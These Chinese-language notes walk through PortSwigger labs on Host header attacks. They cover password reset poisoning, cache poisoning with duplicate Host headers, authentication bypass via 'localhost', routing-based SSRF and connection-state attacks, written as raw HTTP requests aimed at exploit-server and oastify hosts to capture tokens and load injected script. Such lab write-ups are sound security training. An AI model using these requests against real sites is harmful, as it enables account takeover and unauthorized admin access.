
**burp的lab使用 cookie头部 的参数 _lab 来进行设置，在服务器设置cookie后再进行测试**

## 密码重置中毒
文章
https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html

实验：基础密码重置中毒
https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning

使用密码重置功能
POST /forgot-password HTTP/2

修改host头部后，密码重置url为注入host头部
Host: exploit-0a1e004203a262c6806325e9010d004b.exploit-server.net

将post用户名改为目标用户，在受控网站记录上得到其重置令牌
username=carlos


实验：通过中间件进行密码重置中毒
https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
见主题 认证漏洞 - 其他机制


实验：通过悬空标记进行密码重置中毒
https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup

对密码重置功能使用host头部注入
POST /forgot-password HTTP/2
Host: 0a8000f5036a5be8809a1724008800be.web-security-academy.net:fooooooooooooooooooo
响应为
```html
<div style='word-break: break-all' class=dirty-body data-dirty='<p>Hello!</p><p>Please <a href=&apos;https://0a8000f5036a5be8809a1724008800be.web-security-academy.net:fooooooooooooooooooo/login&apos;>click here</a> to login with your new password: 6AefJ8hccY</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>'></div>
```
服务器对单引号进行html编码，然而由于客户端对属性进行html解码，于是单引号仍可终止字符串
尝试使用双引号将剩余内容全部作为字符串，然而无法获得响应

> 一些杀毒软件会扫描邮件中的链接，以识别它们是否具有恶意。 
示例解决方案：
> Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
此处杀毒软件将访问链接，在控制域名的记录中即可找到杀毒软件发出的记录
方向错误，不在于绕过过滤。查看log时，已经有大量之前尝试时的url访问记录，协作服务器中也有。
类似之前lab的应用程序追踪分析后端组件将访问头部url

对url进行攻击，使用 https://username:password@host 尝试将web服务器 host 转为用户名
0a8000f5036a5be8809a1724008800be.web-security-academy.net:fooooooooooooooooooo@iselzgmmfxlpi8lrozcfn5qh288zwrkg.oastify.com


## 通过 Host 头进行 Web 缓存中毒
实验：通过模糊请求进行 Web 缓存投毒
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests

**若开启扩展的缓存破坏，进行缓存中毒时需关闭**
设置两个Host头时：
GET / HTTP/1.1
Host: 6krr70x6fxe062765qqwy1lqjhp8d01p.oastify.com
Host: 0a0300b2034e8126830fd235006200cc.h1-web-security-academy.net
响应
Server Error: Gateway Timeout (1) connecting to 6krr70x6fxe062765qqwy1lqjhp8d01p.oastify.com
服务器对多个Host头不报错，且尝试连接第一个Host头

调换顺序
GET / HTTP/1.1
Host: 0a0300b2034e8126830fd235006200cc.h1-web-security-academy.net
Host: 6krr70x6fxe062765qqwy1lqjhp8d01p.oastify.com
响应为
```html
<script type="text/javascript" src="//6krr70x6fxe062765qqwy1lqjhp8d01p.oastify.com/resources/js/tracking.js"></script>
```
第二个Host头注入到了加载的js脚本中
设置控制网页内容为
alert(document.cookie)
设置控制页面路径为
/resources/js/tracking.js

设置头部为
GET / HTTP/1.1
Host: 0a0300b2034e8126830fd235006200cc.h1-web-security-academy.net
Host: exploit-0a4300cf03fd81868344d12701c0005f.exploit-server.net


## 访问受限功能
实验：主机头认证绕过
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass

访问主页时，注入host头部为本机地址
GET / HTTP/2
Host: localhost
响应中出现管理员面板 
```html
<a href="/admin">Admin panel</a>
```

访问管理员页面
GET /admin HTTP/2
得到
```html
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
```

访问删除功能

## 基于路由的 SSRF
文章 见SSRF主题

实验：基于路由的 SSRF
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf

在对主页的get中设置头部注入
GET / HTTP/2
Host: 0a2b00100349724980e6c66000c800b7.web-security-academy.net
回显了控制服务器的响应

发送到攻击器对内网进行爆破，取消其中的 更新host头 选项
GET /admin HTTP/2
Host: 192.168.0.$0$

其中有一个地址响应为200
```html
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
    <input required type="hidden" name="csrf" value="aSksRv56tJY3JpwjIzK94iriiwurC9KV">
    <label>Username</label>
    <input required type='text' name='username'>
    <button class='button' type='submit'>Delete user</button>
</form>
```

使用此表单信息构建删除请求
POST /admin/delete HTTP/2
csrf=aSksRv56tJY3JpwjIzK94iriiwurC9KV&username=carlos


实验：通过有缺陷的请求解析实现 SSRF
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing

在对主页的get中设置任意头部注入
GET / HTTP/2
Host: x
响应为
Client Error: Forbidden

在url中设置完整路径后返回原始响应
于是设置url为完整路径的同时修改host头部到控制站点
GET https://0a6600ea03e88cb7805cda9100730061.web-security-academy.net HTTP/2
Host: pg9706lx6dqa9dtnmm0m2nwjbah15tti.oastify.com
成功带外

发送到攻击器，取消更新host头的选项
对内网ip进行爆破
Host: 192.168.0.$0$

得到一个302响应
HTTP/2 302 Found
Location: /admin

发送到重复器访问
GET https://0a6600ea03e88cb7805cda9100730061.web-security-academy.net/admin HTTP/2
Host: 192.168.0.156
得到
```html
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
    <input required type="hidden" name="csrf" value="j8urBz4mGvZYsYCVTsXpuuZIoeMiEWOp">
    <label>Username</label>
    <input required type='text' name='username'>
    <button class='button' type='submit'>Delete user</button>
</form>
```

使用表单信息构建请求使用删除功能
POST https://0a6600ea03e88cb7805cda9100730061.web-security-academy.net/admin/delete HTTP/2
Host: 192.168.0.156

csrf=j8urBz4mGvZYsYCVTsXpuuZIoeMiEWOp&username=carlos


## 连接状态攻击

实验：通过连接状态攻击绕过主机验证
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack
关联文章
https://portswigger.net/research/browser-powered-desync-attacks#state

访问主页后发送到重复器
创建组，设置顺序单链接
第一页
GET / HTTP/1.1
Host: 0a68005f037762838069901a004e00a6.h1-web-security-academy.net
第二页
GET /admin HTTP/1.1
Host: 192.168.0.1

响应为
```html
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
    <input required type="hidden" name="csrf" value="xbnmPpg5XJCrrZrPOCR5bTCgdLInDjG6">
    <label>Username</label>
    <input required type='text' name='username'>
    <button class='button' type='submit'>Delete user</button>
</form>
```

使用信息构建删除功能的请求并设置为第二页
POST /admin/delete HTTP/1.1
Host: 192.168.0.1

csrf=xbnmPpg5XJCrrZrPOCR5bTCgdLInDjG6&username=carlos